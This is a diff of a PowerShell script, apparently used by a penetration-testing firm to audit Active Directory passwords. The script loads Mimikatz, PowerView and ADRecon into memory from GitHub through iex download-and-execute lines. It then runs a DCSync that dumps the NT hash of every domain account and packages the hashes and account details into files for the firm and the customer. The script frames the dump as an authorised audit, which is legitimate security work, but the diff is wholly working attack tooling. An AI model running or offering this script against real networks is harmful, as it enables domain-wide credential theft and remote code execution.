@@ -4,10 +4,51 @@
 $DATE = $(get-date -f yyyyMMddThhmm)
 $PATH = "C:\temp\" + $DATE + "_" + "DCSYNC" + "\"
 $EXT = ".txt"
-$LOG = $PATH + $DATE + "_" + "DCSync_NTLM_full_LOG" + $EXT
+$LOGFILE = $PATH + $DATE + "_" + "DCSync_NTLM_LOGFILE" + $EXT
 $HASHES = $PATH + $DATE + "_" + "DCSync_NTLM_Hashes_FINAL" + $EXT
 $USERS = $PATH + $DATE + "_" + "DCSync_NTLM_Users_FINAL" + $EXT
-$IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_UserHash_Import_FINAL" + $EXT
+$PTFHASHES = $PATH + $DATE + "_" + "DCSync_NTLM_PTF_Hashes_FINAL" + $EXT
+$IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_CUSTOMER_Importfile_FINAL" + $EXT
+
+# helper function to convert user account control values
+Function DecodeUserAccountControl ([int]$UAC)
+{
+$UACPropertyFlags = @(
+"SCRIPT",
+"ACCOUNTDISABLE",
+"RESERVED",
+"HOMEDIR_REQUIRED",
+"LOCKOUT",
+"PASSWD_NOTREQD",
+"PASSWD_CANT_CHANGE",
+"ENCRYPTED_TEXT_PWD_ALLOWED",
+"TEMP_DUPLICATE_ACCOUNT",
+"NORMAL_ACCOUNT",
+"RESERVED",
+"INTERDOMAIN_TRUST_ACCOUNT",
+"WORKSTATION_TRUST_ACCOUNT",
+"SERVER_TRUST_ACCOUNT",
+"RESERVED",
+"RESERVED",
+"DONT_EXPIRE_PASSWORD",
+"MNS_LOGON_ACCOUNT",
+"SMARTCARD_REQUIRED",
+"TRUSTED_FOR_DELEGATION",
+"NOT_DELEGATED",
+"USE_DES_KEY_ONLY",
+"DONT_REQ_PREAUTH",
+"PASSWORD_EXPIRED",
+"TRUSTED_TO_AUTH_FOR_DELEGATION",
+"RESERVED",
+"PARTIAL_SECRETS_ACCOUNT"
+"RESERVED"
+"RESERVED"
+"RESERVED"
+"RESERVED"
+"RESERVED"
+)
+return (0..($UACPropertyFlags.Length) | ?{$UAC -bAnd [math]::Pow(2,$_)} | %{$UACPropertyFlags[$_]}) -join ";"
+}
 
 # download mimikatz into memory
 Write-Host "[INFO] Downloading Mimikatz into Memory" -ForegroundColor Gray
@@ -16,6 +57,10 @@ iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 # download powerview into memory
 Write-Host "[INFO] Downloading PowerView into Memory" -ForegroundColor Gray
 iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/PowerSploit/dev/Recon/PowerView.ps1')
+
+# download adrecon into memory
+Write-Host "[INFO] Downloading ADRecon into Memory" -ForegroundColor Gray
+iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/ADRecon/master/ADRecon.ps1')
 
 # print out domain context
 $domain = get-netdomain | Select-Object -property Name | foreach { $_.Name}
@@ -26,28 +71,33 @@ if ($confirmation -eq 'y') {
 
     # create directory for storage
     Write-Host ""
-    Write-Host "[INFO] Creating new directory at $PATH" -ForegroundColor Gray
+    Write-Host "[~] Creating new directory at $PATH" -ForegroundColor Gray
+    Write-Host ""
     New-Item -ItemType Directory -Force -Path $PATH | Out-Null
     
     # execute DCSync to export NT-Hashes
-    Write-Host "[!] Exporting NT-Hashes via DCSync" -ForegroundColor Yellow
-    Write-Host "    >" $LOG -ForegroundColor Gray
-    $command = '"log ' + $LOG + '" "lsadump::dcsync /domain:'+ $domain +' /all /csv"'
-    Invoke-Mimikatz -Command $command
+    Write-Host "[!] Exporting NT-Hashes via DCSync - this may take a while..." -ForegroundColor Yellow
+    Write-Host "    >" $LOGFILE -ForegroundColor Gray
+    $command = '"log ' + $LOGFILE + '" "lsadump::dcsync /domain:'+ $domain +' /all /csv"'
+    Invoke-Mimikatz -Command $command | Out-Null
 
-    # get NTLM only
-    Write-Host "[~] Extracting NT-Hashes from logfile" -ForegroundColor Yellow
-    Write-Host "    > " $HASHES -ForegroundColor Gray
-    (Get-Content -LiteralPath $LOG) -notmatch '\$' | ForEach-Object {$_.Split("`t")[2]} > $HASHES
+    # using ADRecon to extract user details
+    Write-Host "[!] Extracting user details via LDAP" -ForegroundColor Yellow
+    Invoke-ADRecon -method LDAP -Collect Users -OutputType Excel -ADROutputDir $PATH | Out-Null
 
-    # get users only
-    Write-Host "[~] Extracting users from logfile" -ForegroundColor Yellow
-    Write-Host "    > " $USERS -ForegroundColor Gray
-    (Get-Content -LiteralPath $LOG) -notmatch '\$' | ForEach-Object {$_.Split("`t")[1]} > $USERS
+    # create temporary NTLM only and users only files
+    (Get-Content -LiteralPath $LOGFILE) -notmatch '\$' | ForEach-Object {$_.Split("`t")[2]} > $HASHES
+    (Get-Content -LiteralPath $LOGFILE) -notmatch '\$' | ForEach-Object {$_.Split("`t")[1]} > $USERS
+
+    # create hashfile for pentest factory and convert user account attributes
+    Write-Host ""
+    Write-Host "[~] Create file with hashes only" -ForegroundColor Gray
+    $a = (Import-csv -Delimiter "`t" -Path $LOGFILE -header ID,SAMACCOUNTNAME,HASH,TYPE) -notmatch '\[DC\]' -notmatch '\[rpc\]' -notmatch "mimikatz\(powershell\)" -notmatch "for logfile : OK" -notmatch '\$'
+    foreach ($r in $a){ $r.type=DecodeUserAccountControl $r.type}
+    $a | select -Property hash,type | ConvertTo-Csv -NoTypeInformation | Select-Object -skip 1 > $PTFHASHES 
 
     # create import file for customer
-    Write-Host "[~] Create user/hash merge file" -ForegroundColor Yellow
-    Write-Host "    > " $IMPORTFILE -ForegroundColor Gray
+    Write-Host "[~] Create import file with samaccountnames and hashes" -ForegroundColor Gray
     $File1 = Get-Content $USERS
     $File2 = Get-Content $HASHES
     for($i = 0; $i -lt $File1.Count; $i++)
@@ -55,18 +105,27 @@ if ($confirmation -eq 'y') {
         ('{0},{1}' -f $File1[$i],$File2[$i]) |Add-Content $IMPORTFILE
     }
 
+    # sort files into dirs
+    New-Item -Path $PATH\PTF -ItemType Directory | Out-Null
+    New-Item -Path $PATH\CUSTOMER -ItemType Directory | Out-Null
+    Move-Item -Path $PATH\CSV-Files\Users.csv -Destination $PATH\PTF\.
+    Move-Item -Path $PTFHASHES -Destination $PATH\PTF\.
+    Move-Item -Path $IMPORTFILE -Destination $PATH\CUSTOMER\.
+    Move-Item -Path $LOGFILE -Destination $PATH\CUSTOMER\.
+   
+    # cleanup
+    Remove-Item -Path $USERS
+    Remove-Item -Path $HASHES
+    Remove-Item -Path $PATH\CSV-Files\ -recurse
+
     # final message
     Write-Host ""
-    Write-Host "[OK] Hash extraction completed" -ForegroundColor Green
+    Write-Host "[OK] Extraction completed" -ForegroundColor Green
+    Write-Host "  > Please submit the 'PTF' directory to Pentest Factory GmbH" -ForegroundColor Gray
+    Write-Host "  > Please consider all files as confidential!" -ForegroundColor Gray
     Write-Host ""
     explorer $PATH
 
-    # reminder ADRecon
-    Write-Host "[!] Do not forget to run ADRecon" -ForegroundColor Yellow
-    Write-Host "    > iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/ADRecon/master/ADRecon.ps1')" -ForegroundColor Gray
-    Write-Host "    > Invoke-ADRecon -method LDAP -Collect Users -OutputType Excel -ADROutputDir $PATH" -ForegroundColor Gray
-    Write-Host "    > Invoke-ADRecon -GenExcel <CSV-OUTPUT-FILES>" -ForegroundColor Gray
-    Write-Host ""
 }else{
     Write-Host "[!] Script aborted due to wrong domain. Please hardcode the domain in the PS1 script (line 21)." -ForegroundColor Red
 }
